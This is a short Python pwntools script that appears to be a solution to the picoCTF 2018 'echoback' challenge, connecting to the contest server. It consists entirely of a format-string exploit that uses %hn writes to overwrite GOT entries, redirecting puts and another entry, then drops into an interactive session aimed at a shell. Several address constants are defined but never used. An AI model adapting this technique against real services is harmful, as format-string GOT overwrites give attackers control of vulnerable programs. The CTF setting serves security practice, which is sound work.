import struct
from pwn import *
r = remote('2018shell.picoctf.com', 37402)
#r = process('./echoback')
VULN = 0x080485ab
PUTS_PLT = 0x0804a01c
BEFORE_SYS = 0x80485dc
SYS_PLT = 0x804a020

RETURN_ADDR = 0xffffcdac
SYSTEM = 0xf7e0fc00
EBP08 = 0xffffcdb4
binaddr = 0xffffcd40
ouraddr = 0x8048739
esp = 0xffffccfc
binn = 0x6e69622f
sh = 0x68732f2f


exploit = ''
exploit += struct.pack("I", PUTS_PLT)
exploit += struct.pack("I", PUTS_PLT+2)
exploit += "%7$34211x"
exploit += "%7$hn"
exploit += "%8$33369x"
exploit += "%8$hn"
r.sendafter('input your message:', exploit)
payload = ''
payload += p32(0x804a010)
payload += p32(0x804a010 + 2)
payload += '%' + str((0x08048460 & 0xffff) - 4*2) + 'x'
payload += '%7$hn'
payload += '%' + str(0x10000 + ((0x08048460 >> 16) - (0x08048460 & 0xffff)))  + 'x'
payload += '%8$hn'
r.sendafter('input your message:', payload)
r.interactive()


